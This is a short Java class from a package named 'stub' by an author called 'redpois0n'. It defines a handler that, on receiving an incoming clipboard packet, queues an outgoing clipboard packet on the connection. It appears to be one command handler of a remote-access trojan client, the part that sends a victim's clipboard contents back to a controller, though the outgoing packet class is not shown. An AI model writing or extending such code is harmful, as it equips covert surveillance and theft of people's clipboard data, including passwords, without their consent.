package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.stub.packets.outgoing.Packet41Clipboard;


public class Packet59Clipboard extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet41Clipboard());
	}

}
